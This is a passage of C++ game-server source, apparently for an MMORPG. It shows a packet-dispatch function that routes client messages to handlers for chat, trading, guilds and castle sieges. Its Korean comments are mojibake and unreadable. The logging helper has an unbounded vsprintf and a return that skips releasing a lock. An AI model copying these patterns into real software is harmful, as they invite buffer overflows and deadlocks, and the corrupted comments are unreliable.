// GC [0xBC][0x01] �������� ��ü ��û ���� (0xC1)
//----------------------------------------------------------------------------
void GCAnsJewelUnMix			(INT iIndex, INT iResult);
#endif

#ifdef PCBANG_COUPON_EVENT_20060124
//----------------------------------------------------------------------------
// CG [0xBC][0x01] PC�� ���� ������ ���� ��û
//----------------------------------------------------------------------------
void CGReqPCBangCouponItem(LPPMSG_REQ_PCBANG_COUPON_ITEM lpMsg, int iIndex);
//----------------------------------------------------------------------------
// CG [0xBC][0x01] PC�� ���� ������ ���� ��û ����
//----------------------------------------------------------------------------
void CGAnsPCBangCouponItem(LPPMSG_REQ_PCBANG_COUPON_ITEM lpMsg, int iIndex);
#endif // PCBANG_COUPON_EVENT_20060124

#ifdef KANTURU_PROTOCOL_20060705
//----------------------------------------------------------------------------
// CG [0xD1][0x00] Ŭ���̾�Ʈ�� ĭ���� �������� ���� ���� ������ ��û
//----------------------------------------------------------------------------
void CGReqKanturuStateInfo( LPPMSG_REQ_KANTURU_STATE_INFO lpMsg, int iIndex );
//----------------------------------------------------------------------------
// CG [0xD1][0x01] Ŭ���̾�Ʈ�� ĭ���� ������ �����ʿ� ���� ��û
//----------------------------------------------------------------------------
void GCReqEnterKanturuBossMap( LPPMSG_REQ_ENTER_KANTURU_BOSS_MAP lpMsg, int iIndex );
#endif	// #ifdef KANTURU_PROTOCOL_20060705

#ifdef WHITEANGEL_GET_ITEM_EVENT_20060822	// Client <-> GS ó�� �Լ� ����
//----------------------------------------------------------------------------
// CG [0xD0][0x02] ȭ��Ʈ���� ������ ���� ��û
//----------------------------------------------------------------------------
void CGReqWhiteAngelGetItem( LPPMSG_REQ_WHITEANGEL_ITEM lpMsg, int iIndex );
#endif // WHITEANGEL_GET_ITEM_EVENT_20060822

#ifdef PCBANG_POINT_SYSTEM_20070206	// Client <-> GS ó�� �Լ� ����
//----------------------------------------------------------------------------
// CG [0xD0][0x05] PC�� ����Ʈ ���� ������ ����/���� ��� ��û
//----------------------------------------------------------------------------
void  CGReqBuyPCBangPointItem( LPPMSG_REQ_CG_BUY_PCBANG_POINT_ITEM lpMsg, int iIndex );
//----------------------------------------------------------------------------
// CG [0xD0][0x06] PC�� ����Ʈ ���� ����/����
//----------------------------------------------------------------------------
void CGReqPCBangPointShopOpen( LPPMSG_REQ_PCBANG_POINT_SHOP_OPEN lpMsg, int iIndex );
#endif

#ifdef ADD_EVENT_MAP_ILLUSION_TEMPLE_20070328
//----------------------------------------------------------------------------
// CG [0xBF][0x02]	ȯ�� ��� ���� �������
//----------------------------------------------------------------------------
void CGIllusionTempleUseMagic( LPPMSG_ILLUSION_TEMPLE_USE_MAGIC pMsg, int iIndex );
//----------------------------------------------------------------------------
// GC [0xBF][0x06] ȯ�� ������� ���͸� �׿��� ��� ��ų ����Ʈ
//----------------------------------------------------------------------------
void GCIllusionTempleSkillPoint(int iIndex, BYTE btSkillPoint);
#endif

#ifdef THIRD_CHANGEUP_SYSTEM_20070507	// CL <-> GS �Լ� ���� : ����Ʈ�� ����
//----------------------------------------------------------------------------
// CG [0xD0][0x07] 3�� ���� ����Ʈ - ��������� ���� �߰����� ���� ���� ��û
//----------------------------------------------------------------------------
void	CGReqEnterOnWerwolf( LPPMSG_REQ_ENTER_ON_WERWOLF lpMsg, int iIndex );
//----------------------------------------------------------------------------
// CG [0xD0][0x08] 3�� ���� ����Ʈ - ������(����)�� ���� �߰����� �Ƚ�ó ���� ��û
//----------------------------------------------------------------------------
void	CGReqEnterOnGateKeeper( LPPMSG_REQ_ENTER_ON_GATEKEEPER lpMsg, int iIndex );
#endif

#ifdef ADD_ITEM_GIVE_NPC_ALAN_20070823	// CL <-> GS �Լ� ����	
//----------------------------------------------------------------------------
// CG [0xD0][0x09] ������ ���� NPC�ٷ� - ������ ���� ��û ����
//----------------------------------------------------------------------------
void	CGReqAlansItem( LPPMSG_REQ_GIVE_ALANS_ITEM lpMsg, int iIndex );
#endif

//----------------------------------------------------------------------------
// CG [0xD0][0x0A] ������ Ŭ���� �̵� ��û 
//----------------------------------------------------------------------------

#ifdef ADD_NPC_XMASEVENT_20080930
void CGAnsSnowManMoveGate(LPPMSG_REQ_SNOWMAN_NPC lpMsg, int iIndex);
#endif

//----------------------------------------------------------------------------
// CG [0xD0][0x10] ������ ���� X-MAX SANTA - ������ ���� ��û ���� 
//----------------------------------------------------------------------------
#ifdef ADD_GIFTITEM_XMASEVENT_20081030
void	CGReqEventItem( LPPMSG_REQ_GIVE_SANTA_ITEM lpMsg, int iIndex );
#endif 

#ifdef UPDATE_CHANGE_CHARACTERNAME_20080410
//----------------------------------------------------------------------------
// CG [0xF3][0x15] ĳ���͸� ���� Ȯ�ο�û
//----------------------------------------------------------------------------
void	CGReqCheckChangeName(LPPMSG_REQ_CHECK_CHAGNE_NAME lpMsg, int aIndex);
//----------------------------------------------------------------------------
// CG [0xF3][0x16] ĳ���͸� ���� ��û
//----------------------------------------------------------------------------
void	CGChangeName(LPPMSG_CHAGNE_NAME lpMsg, int aIndex);
#endif	// UPDATE_CHANGE_CHARACTERNAME_20080410

#ifdef NEW_SKILL_FORSKYLAND
// â�� �ݴ´�
void CGCloseWindow(int aIndex);
#endif

BOOL PacketCheckTime(LPOBJECTSTRUCT lpObj)
{
	if( GetTickCount()-lpObj->m_PacketCheckTime < 300 ) return FALSE;
	lpObj->m_PacketCheckTime = GetTickCount();
	return TRUE;
}

BOOL DataEncryptCheck(int aIndex, BYTE protoNum, BOOL Encrypt)
{
	if( Encrypt == FALSE )
	{
		LogAdd("Error-L1 : Not Encrypt %s %d", gObj[aIndex].AccountID, protoNum);
		CloseClient(aIndex);
		return FALSE;
	}
	return TRUE;
}

#ifdef PACKET_KUZIMO

#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

BOOL g_bLogCriticalSection = FALSE;
CRITICAL_SECTION g_LogCriticalSection;
const bool g_bFile = false;


void WriteLog(const char *pFilename, char *pszLog, ...)
{
	FILE		*pLogStream;
	char		szBuffer[1024 * 100]="";
	va_list		pArguments;

	if(g_bLogCriticalSection == FALSE)
	{
		InitializeCriticalSection(&g_LogCriticalSection);
		g_bLogCriticalSection = TRUE;
//		DeleteCriticalSection(&g_LogCriticalSection);
	}
	
	//if( strlen(m_szLogFileName) < 1 ) return;
	EnterCriticalSection(&g_LogCriticalSection);	
	
	va_start(pArguments, pszLog);
    vsprintf(szBuffer, pszLog, pArguments);
    va_end(pArguments);

	if(g_bFile == true)
	{
		if( (pLogStream = fopen(pFilename, "a+" )) == NULL )
		{
			return;
		}

		fwrite(szBuffer, strlen(szBuffer), 1, pLogStream);
		
		fclose( pLogStream );
		_fcloseall();
	}
	else
	{
		OutputDebugString(szBuffer);
	}

	LeaveCriticalSection(&g_LogCriticalSection);	
}

#endif

//----------------------------------------------------------------------------
void ProtocolCore(BYTE protoNum, BYTE *aRecv, int aLen, int aIndex, BOOL Encrypt, int serial)
{
/*	if( aRecv[0] == 0xC1 )
	{
		if( aRecv[2] == 0x26 || aRecv[2] == 0x27 || aRecv[2] == 0x2a || aRecv[2] == 0x28 )
		{
			LogAdd("[%s]r 0x%x pos : %d", gObj[aIndex].Name, aRecv[2], aRecv[3]);
		}
		else LogAdd("[%s]r 0x%x", gObj[aIndex].Name, protoNum);
	}
	else LogAdd("[%s]r 0x%x", gObj[aIndex].Name, protoNum);
*/

#ifdef PACKET_KUZIMO
	char tempBuff[1024 * 10];

	wsprintf(tempBuff, "%08u	C	%-12s	UserIndex(%05d)	E(%c)	Serial(%05d)	Msg(0x%02X)	Size(0x%05X)	", 
		GetTickCount(), gObj[aIndex].Name, aIndex, (Encrypt == TRUE)? 'T' : 'F', serial, protoNum, aLen);

	for(int i = 0; i < aLen; i++)
	{
		wsprintf(&tempBuff[strlen(tempBuff)], ",%02X", aRecv[i]);
	}

	wsprintf(&tempBuff[strlen(tempBuff)], "\n");	
	WriteLog("PacketLog.txt", tempBuff);	
#endif

	if( gStalkProtocol )
	{
		if( gStalkProtocolId[0] == gObj[aIndex].AccountID[0] )
		{
			if( gStalkProtocolId[1] == gObj[aIndex].AccountID[1] )
			{
				if( strcmp(gStalkProtocolId,  gObj[aIndex].AccountID ) == 0 )
				{
					LogAddHeadHex(gObj[aIndex].AccountID, (char*)aRecv, aLen);
				}
			}
		}
	}

	if( serial >= 0 )
	{
		if( gObj[aIndex].Type == OBJTYPE_CHARACTER )
		{ 
			if( gNSerialCheck[aIndex].InCheck(serial) == FALSE )
			{
				LogAdd("Error-L1 : Socket Serial %s %d o_serial:%d serial:%d ", 
						gObj[aIndex].AccountID, 
						protoNum, 
						gNSerialCheck[aIndex].GetSerial(), 
						serial);
				CloseClient(aIndex);
			}
		}
	}
	
	// ��������
//	CHAR szTEMP[256];
//	LPPMSG_DEFAULT2 lpMsg3=(LPPMSG_DEFAULT2)aRecv;
//	wsprintf(szTEMP, "(C->S)[%x-%x]\n", protoNum, lpMsg3->subcode);
//	OutputDebugString(szTEMP);

	if( protoNum == 0xF1 || protoNum == 0xF3 )
	{
		switch( protoNum )
		{
		case 0x0E :	// ����� ���� üũ
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
			{
				CGLiveClient((LPPMSG_CLIENTTIME)aRecv, aIndex);
				tempindex = aIndex;
			}
			break;
		case 0xF1 :
			{
			LPPMSG_DEFAULT2 lpMsg2=(LPPMSG_DEFAULT2)aRecv;
			switch( lpMsg2->subcode )
			{
			case 0x01 : //
				if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
					CSPJoinIdPassRequest((LPPMSG_IDPASS)aRecv, aIndex);
				break;
			case 0x02 :	// Ŭ���̾�Ʈ�� ���� �ϰ� �ʹٰ�.. 
				if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
					CGClientCloseMsg((LPPMSG_CLIENTCLOSE)aRecv, aIndex);
				break;
			case 0x03 :
#ifdef PACKET_KUZIMO
	WriteLog("PacketLog.txt", "%08u	S	%-12s	UserIndex(%05d)	LogIn\n", GetTickCount(), gObj[aIndex].Name, aIndex);
#endif
				if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
					CGClientMsg((LPPMSG_CLIENTMSG)aRecv, aIndex);
				break;
			}
			}
			break;
		case 0xF3 :
			{
			LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
			switch( lpDef->subcode )
			{
			case 0x00 :	// ĳ���� ����Ʈ�� �޶�� ��û�ϸ�
				DataServerGetCharListRequest(aIndex);
				break;
			case 0x01 : // ĳ���� ����� ��û
				CGPCharacterCreate((LPPMSG_CHARCREATE)aRecv, aIndex);
				break;
			case 0x02 :	// ĳ���� ���� ��û�� ������
				CGPCharDel((LPPMSG_CHARDELETE)aRecv, aIndex);
				break;
			case 0x03 : // ������ ĳ���ͷ� �� ���� ��û
				CGPCharacterMapJoinRequest((LPPMSG_CHARMAPJOIN)aRecv, aIndex);
				//ObjectMapJoinPositionSend(aIndex);	// �ڽ��� ��ġ�� ������.
				break;
			case 0x06 :	// ������ ����Ʈ�� ��������.
				CGLevelUpPointAdd((LPPMSG_LVPOINTADD)aRecv, aIndex);
				break;
			case 0x12 :
				gObjMoveDataLoadingOK(aIndex);
				break;
#ifdef UPDATE_CHANGE_CHARACTERNAME_20080410 
			case 0x15:
				CGReqCheckChangeName((LPPMSG_REQ_CHECK_CHAGNE_NAME)aRecv, aIndex);
				break;
			case 0x16:
				CGChangeName((LPPMSG_CHAGNE_NAME) aRecv, aIndex);
				break;
#endif // UPDATE_CHANGE_CHARACTERNAME_20080410
			case 0x30 : 
				GCSkillKeyRecv((LPPMSG_SKILLKEY)aRecv, aIndex);
				break;
#ifdef MASTER_LEVEL_SKILL_SYSTEM_20071122	// ���������� �޾Ҵ�.
			case 0x52:
				g_MasterSkillSystem.CGReqGetMasterLevelSkill( ( LPPMSG_REQ_MASTERLEVEL_SKILL )aRecv, aIndex );
				break;				
#endif
			}
			}
			break;
		}
	}
	else
	{
		LPOBJECTSTRUCT lpObj = (LPOBJECTSTRUCT)&gObj[aIndex];
		/*if( gObjIsGamePlaing(lpObj) == FALSE ) 
		{
			if( protoNum != 0x0E )
			{
				LogAdd("error-L3 : %d %s Game Not Play(Protocol:%x,len:%d)", aIndex, gObj[aIndex].Name, protoNum, aLen);
				return;
			}
		}
		*/
		

		switch( protoNum )
		{
		case 0x00 :
			tempindex = aIndex;
			PChatProc((LPPMSG_CHATDATA)aRecv, aIndex);
			break;
		case 0x01 :
			CGChatRecv((LPPMSG_CHATDATA_NUMBER)aRecv, aIndex);
			break;
		case 0x02 :
			CGChatWhisperRecv((LPPMSG_CHATDATA_WHISPER)aRecv, aIndex);
			break;
		case 0x03 :
			CGCheckMainRecv((LPPMSG_CHECK_MAINEXE_RESULT)aRecv, aIndex);
			break;
		case 0x0E :	// ����� ���� üũ
			CGLiveClient((LPPMSG_CLIENTTIME)aRecv, aIndex);
			break;
#ifdef PACKET_CHANGE	
		case PACKET_MOVE :
#else
		case 0x10 :
#endif
			PMoveProc((LPPMSG_MOVE)aRecv, aIndex);
			break;

#ifdef PACKET_CHANGE	
		case PACKET_POSITION :
#else
		case 0x11 :
#endif
			RecvPositionSetProc((LPPMSG_POSISTION_SET)aRecv,aIndex);
			break;

#ifdef PACKET_CHANGE	
		case PACKET_ATTACK :
#else
		case 0x15 :
#endif
			CGAttack((LPPMSG_ATTACK)aRecv, aIndex);
			break;
		case 0x18 :
			CGActionRecv((LPPMSG_ACTION)aRecv, aIndex);
			break;
		case 0x19 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGMagicAttack((LPPMSG_MAGICATTACK)aRecv, aIndex);
			break;
			/*
		case 0x1A :
			CGPosMagicAttackRecv((LPPMSG_POSMAGIC)aRecv, aIndex);
			break;
			*/
			
#ifdef ADD_INFINITY_ARROW_CANCEL_20060516
		case 0x1B:
			{				
				// ��ų ��� ���
				CGMagicCancel( ( LPPMSG_MAGICCANCEL )aRecv, aIndex );
			}
			break;
#endif
			
		case 0x1C :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTeleportRecv((LPPMSG_TELEPORT)aRecv, aIndex);
			
			break;
#ifdef NEW_FORSKYLAND2
		case 0xB0 : 
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTargetTeleportRecv((LPPMSG_TARGET_TELEPORT) aRecv, aIndex);
			break;
#endif

#ifdef PACKET_CHANGE	
		case PACKET_MAGIC_ATTACK :
#else
		case 0x1D :
#endif
			CGBeattackRecv(aRecv, aIndex);
			break;
		case 0x1E :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGDurationMagicRecv((LPPMSG_DURATION_MAGIC_RECV)aRecv, aIndex);
			break;
		case 0x22 :	// ������ �ݰڴٰ� ��û
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGItemGetRequest((LPPMSG_ITEMGETREQUEST)aRecv, aIndex);
			break;
		case 0x23 :	// ������ �������� �����ڴٰ� ��û
			//if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGItemDropRequest((LPPMSG_ITEMTHROW)aRecv, aIndex);
			break;
		case 0x24 :	// �ڽ��� ������ ���� �䱸
			CGInventoryItemMove((LPPMSG_INVENTORYITEMMOVE)aRecv, aIndex);
			break;
		case 0x26 :	// ����ڰ� �������� ����Ѵٰ� ������ ��û
			CGUseItemRecv((LPPMSG_USEITEM)aRecv, aIndex);
			break;
		case 0x30 :	// ���� �ɾ�Դ�.
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTalkRequestRecv((LPPMSG_TALKREQUEST)aRecv, aIndex);
			break;

#ifdef NEW_SKILL_FORSKYLAND
		case 0x31 :	// â�� �ݴ´� (��ȭâ, ����Ʈâ��)		
				CGCloseWindow(aIndex);
			break;
#endif


		case 0x32 :	// �������� ���..
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGBuyRequestRecv((LPPMSG_BUYREQUEST)aRecv, aIndex);
			break;
		case 0x33 :	// �������� ���� �ȱ� ��û
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGSellRequestRecv((LPPMSG_SELLREQUEST)aRecv, aIndex);
			break;
		case 0x34 :	// �������� ������ ��û�Ѵ�
			CGModifyRequestItem((LPPMSG_ITEMDURREPAIR)aRecv, aIndex);
			break;
		case 0x36 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTradeRequestSend((LPPMSG_TRADE_REQUEST)aRecv, aIndex);
			break;
		case 0x37 :
			CGTradeResponseRecv((LPPMSG_TRADE_RESPONSE)aRecv, aIndex);
			break;
		case 0x3A :
			CGTradeMoneyRecv((LPPMSG_TRADE_GOLD)aRecv, aIndex);
			break;
		case 0x3C :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTradeOkButtonRecv((LPPMSG_TRADE_OKBUTTON)aRecv, aIndex);
			break;
		case 0x3D :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGTradeCancelButtonRecv(aIndex);
			break;
#ifdef PERSONAL_SHOP_20040113		// ���λ����� ��Ŷ ó����ƾ
		case 0x3F :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) {
				case 0x00 :		
					break;
				case 0x01 :			// [0x3F][0x01]	���λ��� �������� ���ݺ��� ��û
					CGPShopReqSetItemPrice ((LPPMSG_REQ_PSHOP_SETITEMPRICE) aRecv, aIndex);
					break;
				case 0x02 :			// [0x3F][0x02]	���λ��� ������û -> �̹� ���λ����� ���� �����̸� �����̸��� �����
					CGPShopReqOpen ((LPPMSG_REQ_PSHOP_OPEN) aRecv, aIndex);
					break;
				case 0x03 :			// [0x3F][0x03]	���λ��� �����û
					CGPShopReqClose (aIndex);
					break;
				case 0x05 :			// [0x3F][0x05]	���λ����� ������ ������ �����۸���Ʈ ��û
					CGPShopReqBuyList ((LPPMSG_REQ_BUYLIST_FROM_PSHOP) aRecv, aIndex);
					break;
				case 0x06 :			// [0x3F][0x06]	���λ������� Ư�� ������ ���Կ�û
					CGPShopReqBuyItem ((LPPMSG_REQ_BUYITEM_FROM_PSHOP) aRecv, aIndex);
					//CGPShopReqBuyItemEx ((LPPMSG_REQ_BUYITEM_FROM_PSHOP) aRecv, aIndex, aIndex);
					break;
				}
			}
			break;
#endif
		case 0x40 :	// ��뿡�� ��Ƽ�� ��û�Ѵ�.
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGPartyRequestRecv((LPPMSG_PARTYREQUEST)aRecv, aIndex);
			break;
		case 0x41 :
			if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
				CGPartyRequestResultRecv((LPPMSG_PARTYREQUESTRESULT)aRecv, aIndex);
			break;
		case 0x42 :
			CGPartyList(aIndex);
			break;
		case 0x43 :		
			if( PacketCheckTime(&gObj[aIndex]) == TRUE ) 
				CGPartyDelUser((LPPMSG_PARTYDELUSER)aRecv, aIndex);	
			break;
		case 0x50 :
			CGGuildRequestRecv((LPPMSG_GUILDJOINQ)aRecv, aIndex);
			break;
		case 0x51 :
			CGGuildRequestResultRecv((LPPMSG_GUILDQRESULT)aRecv, aIndex);
			break;
		case 0x52 :
			CGGuildListAll(aIndex);
			break;
		case 0x53 :
			CGGuildDelUser((LPPMSG_GUILDDELUSER)aRecv, aIndex);
			break;
		case 0x54 : 
			CGGuildMasterAnswerRecv((LPPMSG_GUILDMASTERANSWER)aRecv, aIndex);
			break;
		case 0x55 :
			CGGuildMasterInfoSave(aIndex, (LPPMSG_GUILDINFOSAVE)aRecv);
			break;
		case 0x57 :
			CGGuildMasterCreateCancel(aIndex);
			break;
		case 0x61 :
			GCGuildWarRequestSendRecv((LPPMSG_GUILDWARSEND_RESULT)aRecv, aIndex);
			break;

		case 0x5E :
			//CGShellExecution(aRecv, aIndex);
			break;

#ifdef MODIFY_GUILD_VIEWPORT_01_20040701
		case 0x66 :
			GCGuildViewportInfo( (LPPMSG_REQ_GUILDVIEWPORT)aRecv, aIndex );
			break;
#endif

#ifdef MAP_SERVER_WORK_20041030		// ���� �ʺ��� ���� ��Ŷ - ���Ӽ��� <-> Ŭ���̾�Ʈ
		case 0xB1 :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) {
				//----------------------------------------------------------------------------
				// CG [0xB1][0x01] �ʼ��� �̵� �� �߰����� ����, ���ӿ�û (0xC3)
				//----------------------------------------------------------------------------
				case 0x01 :		
					if( DataEncryptCheck(aIndex, protoNum, Encrypt) )
						CGReqMapSvrAuth	((LPPMSG_REQ_MAPSERVERAUTH)aRecv, aIndex);
					break;
				}
			}
			break;
#endif

#ifdef MU_CASTLESIEGE_CL_PROTOCOL_20041122	// �� ������ - �� Ŭ���̾�Ʈ ���� ��������, ��� �κ�
		case 0xB2 :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) {
				//----------------------------------------------------------------------------
				// CG [0xB2][0x00] Ŭ���̾�Ʈ�� ������ ���������� ��û
				//----------------------------------------------------------------------------
				case 0x00 :		
					CGReqCastleSiegeState	((LPPMSG_REQ_CASTLESIEGESTATE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x01] ������ ����� ��û
				//----------------------------------------------------------------------------
				case 0x01 :		
					CGReqRegCastleSiege		((LPPMSG_REQ_REGCASTLESIEGE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x02] ������ ���⸦ ��û
				//----------------------------------------------------------------------------
				case 0x02 :		
					CGReqGiveUpCastleSiege	((LPPMSG_REQ_GIVEUPCASTLESIEGE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x03] �ڽ��� ����� ������Ͽ� ���� ������ ��û
				//----------------------------------------------------------------------------
				case 0x03 :		
					CGReqGuildRegInfo		((LPPMSG_REQ_GUILDREGINFO)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x04] �ڽ��� ����� ������ ǥ�� ��� ��û
				//----------------------------------------------------------------------------
				case 0x04 :		
					CGReqRegGuildMark		((LPPMSG_REQ_REGGUILDMARK)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x05] ������ NPC ���� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				case 0x05 :		
					CGReqNpcBuy				((LPPMSG_REQ_NPCBUY)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x06] ������ NPC ���� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				case 0x06:		
					CGReqNpcRepair			((LPPMSG_REQ_NPCREPAIR)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x07] ������ NPC ���׷��̵� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				case 0x07:		
					CGReqNpcUpgrade			((LPPMSG_REQ_NPCUPGRADE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x08] ���� ���� �ڱ�, ���� ���� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				 case 0X08:
					CGReqTaxMoneyInfo		((LPPMSG_REQ_TAXMONEYINFO)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x09] ���� ���� ���� ���� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				 case 0X09:
					CGReqTaxRateChange		((LPPMSG_REQ_TAXRATECHANGE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x10] ���� ���� �ڱ� ��� ��û -> ����üũ, �������� ����
				//----------------------------------------------------------------------------
				 case 0X10:
					CGReqMoneyDrawOut		((LPPMSG_REQ_MONEYDRAWOUT)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x12] Ư�� ������ ���� ������� ��û (0xC1)
				//----------------------------------------------------------------------------
				case 0X12:
					CGReqCsGateOperate		((LPPMSG_REQ_CSGATEOPERATE)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x1B] �̴ϸ� �����͸� �ֱ������� ������ ���� ��û (0xC1)
				//----------------------------------------------------------------------------
				case 0X1B:
					CGReqCsMiniMapData		((LPPMSG_REQ_MINIMAPDATA)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x1C] �̴ϸ� �����͸� ���̻� ������ ����� �˸� (0xC1)
				//----------------------------------------------------------------------------
				case 0X1C:
					CGReqStopCsMiniMapData	((LPPMSG_REQ_STOPMINIMAPDATA)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x1D] ������ ������� �渶�� ����鿡�� ���� ���� (0xC1)
				//----------------------------------------------------------------------------
				case 0X1D:
					CGReqCsSendCommand		((LPPMSG_REQ_CSCOMMAND)aRecv, aIndex);
					break;
				//----------------------------------------------------------------------------
				// CG [0xB2][0x1F] �� ����� ���� ���ɿ��� ���� ��û (0xC1)
				//----------------------------------------------------------------------------
				case 0X1F:
					CGReqCsSetEnterHuntZone	((LPPMSG_REQ_CSHUNTZONEENTER) aRecv, aIndex);
					break;
				}
			}
			break;
		//----------------------------------------------------------------------------
		// CG [0xB3] �������� DB�� �����Ǵ� Ư�� NPC�� ����� ��û -> ����üũ, �������� ����
		//----------------------------------------------------------------------------
		case 0xB3 :		
			CGReqNpcDbList			((LPPMSG_REQ_NPCDBLIST)aRecv, aIndex);
			break;
		//----------------------------------------------------------------------------
		// CG [0xB4] ���� ��� ����� ��û
		//----------------------------------------------------------------------------
		case 0xB4 :		
			CGReqCsRegGuildList		((LPPMSG_REQ_CSREGGUILDLIST)aRecv, aIndex);
			break;
		//----------------------------------------------------------------------------
		// CG [0xB5] ���� ���� ����� ��û
		//----------------------------------------------------------------------------
		case 0x0B5 :
			CGReqCsAttkGuildList	((LPPMSG_REQ_CSATTKGUILDLIST)aRecv, aIndex);
			break;
#endif
		
#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116
		case 0xB7 :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) 
				{
				// ���� ���� ��� ��û.
				case 0x01 :		
					CGReqWeaponUse	((LPPMSG_REQ_USEWEAPON)aRecv, aIndex);
					break;
				// ���� ���� �ִϸ��̼��� ����.
				case 0x04:
					CGReqWeaponDamageValue((LPPMSG_REQ_WEAPON_DAMAGE_VALUE)aRecv, aIndex);
					break;
				}
				
			}
			break;

#endif

		case 0xB9 :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) 
				{
#ifdef ADD_NEW_CASTLE_FLAG_01_20041227
				// ���� ��ũ ������ ��û�ߴ�.
				case 0x02 :		
					CGReqGuildMarkOfCastleOwner	((LPPMSG_REQ_GUILDMARK_OF_CASTLEOWNER)aRecv, aIndex);
					break;
#endif

#ifdef ADD_CASTLE_HUNTZONE_NPC_01_20050111
//				case 0x04 :
//					CGReqSettingOfCastleHuntZoneEntrance((LPPMSG_REQ_SETTING_OF_CASTLE_HUNTZONE)aRecv, aIndex);
//					break;

				case 0x05 :
					CGReqCastleHuntZoneEntrance((LPPMSG_REQ_MOVE_TO_CASTLE_HUNTZONE)aRecv, aIndex);
					break;
#endif
				}
			}
			break;


#ifdef JEWEL_MIX_SYSTEM_20050309			// �������� ���� / ��ü ��û
		case 0xBC :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) 
				{
				case 0x00 :					// �������� ����
					CGReqJewelMix((LPPMSG_REQ_JEWEL_MIX)aRecv, aIndex);
					break;
				case 0x01 :					// �������� ��ü
					CGReqJewelUnMix((LPPMSG_REQ_JEWEL_UNMIX)aRecv, aIndex);
					break;
				}
			}
			break;
#endif

#ifdef MU_CRYWOLF_CL_PROTOCOL_20050505 // ũ���̿��� - �� Ŭ���̾�Ʈ ���� ��������, ��� �κ�
		case 0xBD :
			{
				LPPMSG_DEFAULT2 lpDef = (LPPMSG_DEFAULT2)aRecv;
				switch(lpDef->subcode) 
				{
				case 0x00 :
					// [0xBD][0x00] ũ���̿��� ����/������¸� ��û�Ѵ�
					CGReqCrywolfInfo((LPPMSG_REQ_CRYWOLF_INFO)aRecv, aIndex);
					break;
				case 0x03 :
					// [0xBD][0x03] ������ ��ܰ��� ����� ��û�Ѵ�
					CGReqAlatrContract((LPPMSG_REQ_CRYWOLF_ALTAR_CONTRACT)aRecv, aIndex );
					break;
				case 0x09 :
					CGReqPlusChaosRate((LPPMSG_REQ_CRYWOLF_BENEFIT_PLUS_CHAOSRATE)aRecv, aIndex );
					break;
				}
				

			}

			break;

		case 0xBE :
			{
				
			}
#endif

			
#ifdef ADD_NEW_GUILD_01_20040913
		case 0xE1 :
			CGGuildAssignStatus( (LPPMSG_GUILD_ASSIGN_STATUS_REQ)aRecv, aIndex );
			break;
#endif

#ifdef ADD_NEW_GUILD_02_20040922
		case 0xE2 :
			CGGuildAssignType( (LPPMSG_GUILD_ASSIGN_TYPE_REQ)aRecv, aIndex );
			break;
#endif
			
#ifdef ADD_NEW_UNION_01_20041006
		case 0xE5 :
			// ���� �α� / ���� ��û
			CGRelationShipReqJoinBreakOff( (LPPMSG_RELATIONSHIP_JOIN_BREAKOFF_REQ)aRecv, aIndex );
			break;
		case 0xE6 :
			CGRelationShipAnsJoinBreakOff( (LPPMSG_RELATIONSHIP_JOIN_BREAKOFF_ANS)aRecv, aIndex );
			break;
		case 0xE9 :
